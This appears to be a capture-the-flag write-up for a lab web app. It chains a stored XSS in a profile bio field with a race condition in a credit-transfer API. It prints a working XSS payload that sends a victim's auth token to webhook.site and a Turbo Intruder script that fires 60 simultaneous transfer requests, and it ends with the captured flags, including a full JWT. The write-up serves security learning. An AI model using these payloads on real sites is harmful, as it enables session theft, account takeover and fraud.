1. Overview

This assessment focuses on an end-to-end exploit chain on the secleak.secenv environment. The goal was to escalate privileges from a standard user to a premium subscriber by chaining a client-side injection with a server-side logic flaw.

2. Phase 1: Session Hijacking via Stored XSSThe first objective was to compromise a high-privilege account (Mr. Short). Testing identified that the user profile's "Bio" field did not sanitize HTML tags, allowing for Stored XSS.

The ExploitAn iframe with a srcdoc attribute was used to bypass basic filters and execute JavaScript that steals the auth_token from the victim's local storage.

Payload:HTML<iframe srcdoc="
  <script>
    const token = localStorage.auth_token;
    const i = new Image();
    i.src = 'https://webhook.site/your-unique-id?jwt=' + encodeURIComponent(token);
    document.body.appendChild(i);
  </script>
"></iframe>

3. Phase 2: Credit Manipulation via Race ConditionAfter hijacking Mr. Short's session, the next goal was to bypass the credit system to afford "The Hive" subscription (10,000 credits).The VulnerabilityThe transfer API was vulnerable to a Time-of-Check to Time-of-Use (TOCTOU) race condition. The system verified funds before subtracting them, but multiple concurrent threads could pass the verification step simultaneously.The Attack Script (Turbo Intruder)To exploit this, a Single-Packet Attack was launched using the following Python script. This script uses a "Gate" to release all requests at the exact same millisecond.Pythondef queueRequests(target, wordlists):
    
    # Setup connection pool
    num_burst = 60 
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=num_burst,
                           requestsPerConnection=1,
                           pipeline=False)

    gate = 'sync_gate'

    # Queue 60 identical transfer requests
    for i in range(num_burst):
        engine.queue(target.req, gate=gate)

    # Release all requests at once
    engine.openGate(gate)

def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)

4. Final Access & Flag RetrievalBy racing transfers of increasing amounts (10 -> 100 -> 1000), the balance was successfully inflated. This allowed for the purchase of the "The Hive" subscription, which unlocked a private post containing the second flag.

Flag 1: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjcxMzU1OTYsIm5iZiI6MTc2NzEzNTU5NiwianRpIjoiZGFiMDg3OTMtNDExMC00NDM2LWExZWMtNjJhNGM4ZjYxMTJkIiwiaWRlbnRpdHkiOnsidWlkIjoxMzA4LCJuaWNrIjoiTXIuIFNob3J0In0sImZyZXNoIjpmYWxzZSwidHlwZSI6ImFjY2VzcyJ9.1tyBWz7PAHlJamS4rhd4VIfdL2nwV8c-lV4TMxN6Qe0


Flag 2: dd75264b671f94de4fee9dc4c793fba3887c5a53437be003a36c7ee0
